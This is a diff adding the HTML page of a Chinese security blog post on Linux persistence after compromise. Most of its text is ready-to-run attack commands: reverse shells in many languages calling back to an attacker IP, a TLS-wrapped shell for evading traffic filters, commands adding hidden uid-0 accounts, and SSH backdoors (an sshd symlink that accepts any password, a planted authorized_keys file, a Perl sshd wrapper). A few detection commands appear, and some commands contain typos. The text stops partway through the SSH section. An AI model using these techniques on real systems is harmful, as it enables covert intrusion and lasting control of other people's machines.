@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="V4ler1an Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="http://v4ler1an.com//img/pwn.jpg">
+    <meta property="twitter:image" content="http://v4ler1an.com//img/pwn.jpg" />
+    
+
+    
+    <meta name="title" content="Linux下的权限维持" />
+    <meta property="og:title" content="Linux下的权限维持" />
+    <meta property="twitter:title" content="Linux下的权限维持" />
+    
+
+    
+    <meta name="description" content="简单总结下Linux平台下的反弹shell方法和权限维持方法">
+    <meta property="og:description" content="简单总结下Linux平台下的反弹shell方法和权限维持方法" />
+    <meta property="twitter:description" content="简单总结下Linux平台下的反弹shell方法和权限维持方法" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="V4ler1an, 有毒, yaoyao , V4ler1an的网络日志, V4ler1an的博客, V4ler1an Blog, 博客, 个人网站, Security, Binary, CTF, Windows, PWN, Re">
+    <link rel="shortcut icon" href="/img/icon2.jpg">
+
+    <title>Linux下的权限维持-V4ler1an的博客 | V4ler1an Blog</title>
+
+    <link rel="canonical" href="/2020/12/Backdoor">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+	
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    
+    <link rel="stylesheet" href="/css/syntax.css">
+    
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+    
+    
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    
+    <script src="/js/jquery.min.js"></script>
+    
+    
+    <script src="/js/bootstrap.min.js"></script>
+    
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/dracula.min.css">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    
+
+</head>
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">V4ler1an Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/ctf">ctf</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/tech">tech</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/tips">tips</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/vuln">vuln</a>
+                    </li>
+                    
+                    
+		    
+                        <li><a href="/top/books/">BOOKS</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search">SEARCH <img src="/img/search.png" height="15" style="cursor: pointer;" alt="Search"></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/top-bg8.jpg')
+    }
+</style>
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/security" title="Security">
+                            Security
+                        </a>
+                        
+                    </div>
+                    <h1>Linux下的权限维持</h1>
+                    <h2 class="subheading">权限维持</h2>
+                    <span class="meta">
+                        Posted by 
+                        
+                            V4ler1an
+                         
+                        on 
+                        Sunday, December 13, 2020
+                        
+                        
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <header>
+                    <h2>TOC</h2>
+                </header>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一basic-knowledge">一、Basic Knowledge</a>
+      <ul>
+        <li><a href="#1-概念">1. 概念</a></li>
+        <li><a href="#2-前置条件----获取初始权限">2. 前置条件 &ndash; 获取初始权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#二权限维持方法">二、权限维持方法</a>
+      <ul>
+        <li><a href="#1-一句话添加用户和密码">1. 一句话添加用户和密码</a></li>
+        <li><a href="#2-增加超级用户">2. 增加超级用户</a></li>
+        <li><a href="#1-ssh后门">1. SSH后门</a></li>
+        <li><a href="#3-suid-shell">3. SUID Shell</a></li>
+        <li><a href="#4-crontab后门文件落地">4. crontab后门（文件落地）</a></li>
+        <li><a href="#5-alias欺骗文件落地">5. alias欺骗（文件落地）</a></li>
+        <li><a href="#6-linux-pam密码记录后门文件落地">6. Linux PAM密码记录后门（文件落地）</a></li>
+        <li><a href="#5-prompt_command后门">5. PROMPT_COMMAND后门</a></li>
+        <li><a href="#7-rootkit">7. Rootkit</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文献">参考文献</a></li>
+    <li><a href="#测试结果">测试结果</a></li>
+  </ul>
+</nav>
+                
+                <h1 id="权限维持----linux">权限维持 &ndash; Linux</h1>
+<h2 id="一basic-knowledge">一、Basic Knowledge</h2>
+<h3 id="1-概念">1. 概念</h3>
+<p>可以简单理解为通过隐藏手段或在目标上安装后门以保持已获取的权限不会被打掉，一直控制目标，属于后渗透阶段的重点内容。</p>
+<h3 id="2-前置条件----获取初始权限">2. 前置条件 &ndash; 获取初始权限</h3>
+<p>获取初始权限。最常见也是个人最喜欢的是反弹shell回来，方便后续操作。这里简单总结下反弹shell的常见手法：</p>
+<h4 id="1-bash反弹">1. Bash反弹</h4>
+<p>攻击机监听：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvvp port
+</code></pre></div><p>目标执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;<span style="color:#ae81ff">1</span>
+
+</code></pre></div><p>或者</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;<span style="color:#ae81ff">5</span> 1&gt;&amp;<span style="color:#ae81ff">5</span>
+</code></pre></div><ul>
+<li><code>bash -i</code>：打开一个交互的bash</li>
+<li><code>&gt;&amp; /dev/tcp/x.x.x.x/port</code>：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。</li>
+<li><code>0&gt;&amp;1</code>：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。</li>
+</ul>
+<p>第二种则是将标准输入、输出和错误均重定向到socket连接文件。</p>
+<p><strong>备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。</strong></p>
+<h4 id="2-telnet反弹">2. telnet反弹</h4>
+<p>第一种：</p>
+<p>攻击机开2个终端，分别执行监听：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lv port1
+</code></pre></div><p>和</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nv -lv port2
+</code></pre></div><p>目标主机执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2
+</code></pre></div><p>监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。</p>
+<p>第二种：</p>
+<p>攻击机监听：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lv port
+</code></pre></div><p>目标主机执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0&lt;/tmp/a | /bin/bash 1&gt;tmp/a
+</code></pre></div><p>其中x.x.x.x为攻击机ip。</p>
+<h4 id="3-ncnetcat反弹">3. nc(netcat)反弹</h4>
+<p>攻击机监听：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lv port
+</code></pre></div><p>目标执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -e /bin/bash x.x.x.x port
+</code></pre></div><p>如果目标上没有<code>-e</code>参数可以使用以下命令：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;$1 | nc x.x.x.x port &gt;/tmp/f
+</code></pre></div><p><code>mkfifo</code>的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。</p>
+<p>此外，也可以使用telnet的监听2个端口的方式：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2
+</code></pre></div><h4 id="4-常见脚本反弹">4. 常见脚本反弹</h4>
+<p>下述脚本均需要现在攻击机上开启监听：<code>nc -lv port</code>，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。</p>
+<h5 id="1-python">1. Python</h5>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;x.x.x.x&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><h5 id="2-perl">2. Perl</h5>
+<ol>
+<li>
+<p>第一种：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"> perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;$i=&#34;x.x.x.x&#34;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</code></pre></div></li>
+<li>
+<p>第二种：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"> perl <span style="color:#f92672">-</span>MIO <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;x.x.x.x:port&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</code></pre></div></li>
+</ol>
+<h5 id="3-ruby">3. Ruby</h5>
+<ol>
+<li>
+<p>第一种：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"> ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;exit if fork;c=TCPSocket.new(&#34;x.x.x.x&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</code></pre></div></li>
+<li>
+<p>第二种：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"> ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e<span style="color:#e6db74">&#39;f=TCPSocket.open(&#34;x.x.x.x&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+</code></pre></div></li>
+</ol>
+<h5 id="4-php">4. PHP</h5>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;x.x.x.x&#34;,port);exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code></pre></div><h5 id="5-java">5. Java</h5>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Revs</span> <span style="color:#f92672">{</span>
+    <span style="color:#75715e">/**
+</span><span style="color:#75715e">    * @param args
+</span><span style="color:#75715e">    * @throws Exception 
+</span><span style="color:#75715e">    */</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+        <span style="color:#75715e">// TODO Auto-generated method stub
+</span><span style="color:#75715e"></span>        Runtime r <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">();</span>
+        String cmd<span style="color:#f92672">[]=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#f92672">};</span>
+        Process p <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>cmd<span style="color:#f92672">);</span>
+        p<span style="color:#f92672">.</span><span style="color:#a6e22e">waitFor</span><span style="color:#f92672">();</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><h5 id="6-lua">6. Lua</h5>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua">lua <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;port&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</span>
+</code></pre></div><h4 id="3-其他方法">3. 其他方法</h4>
+<h5 id="1-socat">1. socat</h5>
+<p>攻击机监听：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:port
+</code></pre></div><p>上传socat到目标主机，然后执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat exec:<span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setid,sigint,sane tcp x.x.x.x:port
+</code></pre></div><h5 id="2-只有80和443端口且反弹shell流量被拦截">2. 只有80和443端口且反弹shell流量被拦截</h5>
+<p>方法论：加密流程，绕过拦截</p>
+<p>Step 1：VPS上生成SSL证书的公钥/私钥对</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span style="color:#ae81ff">365</span> -nodes
+</code></pre></div><p>Step 2：VPN监听反弹shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl s_server -quiet  -key key.pem -cert cert.pem -port <span style="color:#ae81ff">443</span>
+</code></pre></div><p>Step 3：连接</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkfifo /tmp/v4ler1an;/bin/bash -i &lt; /tmp/v4ler1an 2&gt;&amp;<span style="color:#ae81ff">1</span> |openssl s_client -quiet -connect x.x.x.x:443 &gt; /tmp/v4ler1an
+</code></pre></div><p>此时的shell存在缺陷（无法命令补全等），通过以下方法修复：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><p><code>pty</code>是一个伪终端模块。<code>pty.spawn(argv[, master_read[, stdin_read]])</code>产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。
+在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值</p>
+<h2 id="二权限维持方法">二、权限维持方法</h2>
+<h3 id="1-一句话添加用户和密码">1. 一句话添加用户和密码</h3>
+<p>添加普通用户：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 创建一个用户名guest，密码为123456的普通用户</span>
+
+useradd -p <span style="color:#e6db74">`</span>openssl passwd -1 -salt <span style="color:#e6db74">&#39;salt&#39;</span> 123456<span style="color:#e6db74">`</span> guest
+
+<span style="color:#75715e"># useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。</span>
+useradd -p <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>openssl passwd -1 123456<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> guest
+
+<span style="color:#75715e"># chpasswd方法</span>
+useradd guest;echo <span style="color:#e6db74">&#39;guest:123456&#39;</span>|chpasswd
+
+<span style="color:#75715e"># echo -e方法</span>
+useradd guest;echo -e <span style="color:#e6db74">&#34;123456\n123456\n&#34;</span> |passwd guest
+</code></pre></div><p>添加root用户：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 创建一个用户名为guest，密码为123456的root用户</span>
+useradd -p <span style="color:#e6db74">`</span>openssl passwd -1 -salt <span style="color:#e6db74">&#39;salt&#39;</span> 123456<span style="color:#e6db74">`</span> guest -o -u <span style="color:#ae81ff">0</span> -g root -G root -s /bin/bash -d /home/guest
+</code></pre></div><p>排查方法：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 查询特权用户（uid = 0）</span>
+awk -F: <span style="color:#e6db74">&#39;$3==0{print $1}&#39;</span> /etec/passwd
+<span style="color:#75715e"># 查询可以远程登录的帐号信息</span>
+awk <span style="color:#e6db74">&#39;/\$1|\$6/{print $1}&#39;</span> /etc/shadow
+<span style="color:#75715e"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span>
+more /etc/sudoers | grep -v <span style="color:#e6db74">&#34;^#\|^</span>$<span style="color:#e6db74">&#34;</span> | grep <span style="color:#e6db74">&#34;ALL=(ALL)&#34;</span>
+</code></pre></div><h3 id="2-增加超级用户">2. 增加超级用户</h3>
+<p>在完成用户添加后，可以对添加的用户赋予超级用户权限。</p>
+<p>目标主机执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;v4ler1an:x:0:0::/:/bin/sh&#34;</span> &gt;&gt; /etc/passwd
+</code></pre></div><p>如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;v4ler1an::-1:-1:-1:-1:-1:-1:500&#34;</span> &gt;&gt; /etc/shadow
+</code></pre></div><p>有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。</p>
+<h3 id="1-ssh后门">1. SSH后门</h3>
+<h4 id="1-sshd-软连接">1. sshd 软连接</h4>
+<p>目标主机建立软连接：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort<span style="color:#f92672">=</span>5555;
+</code></pre></div><p>攻击机直接ssh登录</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh root@x.x.x.x -p <span style="color:#ae81ff">5555</span>
+</code></pre></div><p>这里端口可以任意，但是<code>/tmp/su</code>部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为<code>sufficient</code>时只要<code>pam_rootok</code>模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: <code>/etc/pam.d/su</code>)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见<a href="http://www.91ri.org/16803.html">Linux的一个后门引发对PAM的探究</a>。</p>
+<p>缺点：易被排查，通过进程、端口可以轻松看到异常，使用<code>kill -s 9 PID</code>即可清除后门。</p>
+<h4 id="2-ssh免密后门文件落地">2. ssh免密后门(文件落地)</h4>
+<p>在攻击机上生成一对公私钥，然后将公钥上传到目标主机，路径为<code>~/.ssh/authorized_keys</code>，攻击机本地保存私钥。通过ssh登录，ssh程序会发送私钥到目标主机与公钥进行匹配，匹配通过即可实现ssh登录。</p>
+<p>生成公钥和私钥：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa
+</code></pre></div><p>进入<code>/root/.ssh</code>，将公钥<code>id_rsa.pub</code>的内容复制到目标主机（是否上传替换文件取决于具体情况），在<code>/root/.ssh/authorized_keys</code>中追加<code>id_rsa.pub</code>中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。)</p>
+<p>缺点：易被排查，检查<code>/root/.ssh/authorized_keys</code>是否被修改，清理不受信的公钥即可清除后门。</p>
+<h4 id="3-ssh-wrapper文件落地">3. ssh wrapper（文件落地）</h4>
+<p>目标主机上执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /usr/sbin/
+mv sshd ../bin/
+echo <span style="color:#e6db74">&#39;#!/usr/bin/perl&#39;</span> &gt;sshd
+echo <span style="color:#e6db74">&#39;exec &#34;/bin/sh&#34; if(getpeername(STDIN) =~ /^..4A/);&#39;</span> &gt;&gt;sshd
+echo <span style="color:#e6db74">&#39;exec{&#34;/usr/bin/sshd&#34;} &#34;/usr/sbin/sshd&#34;,@ARGV,&#39;</span> &gt;&gt;sshd
+chmod u+x sshd
+/etc/init.d/sshd restart
+</code></pre></div><p>完成后执行<code>cat sshd</code>进行验证，输出如下则说明配置成功：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/perl
+</span><span style="color:#75715e"></span>exec <span style="color:#e6db74">&#34;/bin/sh&#34;</span> <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>getpeername<span style="color:#f92672">(</span>STDIN<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>~ /^..4A/<span style="color:#f92672">)</span>;
+exec<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/usr/bin/sshd&#34;</span><span style="color:#f92672">}</span> <span style="color:#e6db74">&#34;/usr/sbin/sshd&#34;</span>,@ARGV,
+</code></pre></div><p>攻击机上执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat STDIO TCP4:x.x.x.x:22,sourceport<span style="color:#f92672">=</span><span style="color:#ae81ff">13377</span>
+</code></pre></div><p>这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; buffer <span style="color:#f92672">=</span> struct.pack<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&gt;I6&#39;</span>,19256<span style="color:#f92672">)</span>
+&gt;&gt;&gt; print repr<span style="color:#f92672">(</span>buffer<span style="color:#f92672">)</span>
+<span style="color:#e6db74">&#39;\x00\x00LF&#39;</span>
+&gt;&gt;&gt; buffer <span style="color:#f92672">=</span> struct.pack<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&gt;I6&#39;</span>,13377<span style="color:#f92672">)</span>
+&gt;&gt;&gt; print buffer
+4A
+</code></pre></div><p>原理简单说明：<code>init</code>首先启动的是<code>/usr/sbin/sshd</code>,脚本执行到<code>getpeername</code>这里的时候，正则匹配会失败，于是执行下一句，启动<code>/usr/bin/sshd</code>，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的<code>/usr/sbin/sshd</code>，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，<code>getpeername</code>能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。</p>
+<p>排查方法：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -al /usr/sbin/sshd
+cat /usr/sbin/sshd
